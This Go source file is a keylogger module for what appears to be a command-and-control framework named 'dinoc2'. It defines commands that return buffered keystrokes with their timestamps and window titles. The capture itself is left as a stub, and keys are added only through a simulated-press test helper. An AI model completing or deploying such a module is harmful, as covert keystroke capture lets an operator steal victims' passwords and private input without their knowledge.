package keylogger

import (
	"fmt"
	"sync"
	"time"

	"dinoc2/pkg/module"
)

// KeyloggerModule implements a keylogging module
type KeyloggerModule struct {
	name        string
	description string
	mutex       sync.Mutex
	isRunning   bool
	isPaused    bool
	buffer      []KeyEvent
	stats       map[string]interface{}
}

// KeyEvent represents a keyboard event
type KeyEvent struct {
	Key       string
	Timestamp time.Time
	Window    string
}

// NewKeyloggerModule creates a new keylogger module
func NewKeyloggerModule() module.Module {
	return &KeyloggerModule{
		name:        "keylogger",
		description: "Keyboard input logging",
		buffer:      make([]KeyEvent, 0),
		stats:       make(map[string]interface{}),
	}
}

// Init initializes the module
func (m *KeyloggerModule) Init(params map[string]interface{}) error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if already running
	if m.isRunning {
		return fmt.Errorf("keylogger module already running")
	}

	m.isRunning = true
	m.stats["keys_logged"] = 0

	// In a real implementation, this would start a background goroutine
	// to capture keyboard events using platform-specific APIs

	return nil
}

// Exec executes a keylogger operation
func (m *KeyloggerModule) Exec(command string, args ...interface{}) (interface{}, error) {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if running
	if !m.isRunning {
		return nil, fmt.Errorf("keylogger module not running")
	}

	// Check if paused
	if m.isPaused {
		return nil, fmt.Errorf("keylogger module is paused")
	}

	// Parse command
	switch command {
	case "get":
		// Get logged keys
		return m.getLoggedKeys()

	case "clear":
		// Clear logged keys
		return m.clearLoggedKeys()

	case "status":
		// Get status
		return m.stats, nil

	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}

// getLoggedKeys returns the logged keys
func (m *KeyloggerModule) getLoggedKeys() ([]map[string]string, error) {
	// Convert buffer to a serializable format
	result := make([]map[string]string, len(m.buffer))
	for i, event := range m.buffer {
		result[i] = map[string]string{
			"key":       event.Key,
			"timestamp": event.Timestamp.Format(time.RFC3339),
			"window":    event.Window,
		}
	}

	return result, nil
}

// clearLoggedKeys clears the logged keys
func (m *KeyloggerModule) clearLoggedKeys() (int, error) {
	count := len(m.buffer)
	m.buffer = make([]KeyEvent, 0)
	return count, nil
}

// simulateKeyPress simulates a key press (for testing)
func (m *KeyloggerModule) simulateKeyPress(key, window string) {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning || m.isPaused {
		return
	}

	// Add key event to buffer
	m.buffer = append(m.buffer, KeyEvent{
		Key:       key,
		Timestamp: time.Now(),
		Window:    window,
	})

	// Update stats
	m.stats["keys_logged"] = m.stats["keys_logged"].(int) + 1
}

// Shutdown shuts down the module
func (m *KeyloggerModule) Shutdown() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if running
	if !m.isRunning {
		return nil
	}

	// In a real implementation, this would stop the background goroutine

	m.isRunning = false

	return nil
}

// GetStatus returns the module status
func (m *KeyloggerModule) GetStatus() module.ModuleStatus {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	status := module.ModuleStatus{
		Running: m.isRunning,
		Stats: map[string]interface{}{
			"keys_logged": m.stats["keys_logged"],
			"paused":      m.isPaused,
		},
	}

	return status
}

// GetCapabilities returns the module capabilities
func (m *KeyloggerModule) GetCapabilities() []string {
	return []string{
		"get",
		"clear",
		"status",
	}
}

// Pause temporarily pauses the module's operations
func (m *KeyloggerModule) Pause() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning {
		return fmt.Errorf("module not running")
	}

	if m.isPaused {
		return nil // Already paused
	}

	m.isPaused = true
	return nil
}

// Resume resumes the module's operations after a pause
func (m *KeyloggerModule) Resume() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning {
		return fmt.Errorf("module not running")
	}

	if !m.isPaused {
		return nil // Not paused
	}

	m.isPaused = false
	return nil
}
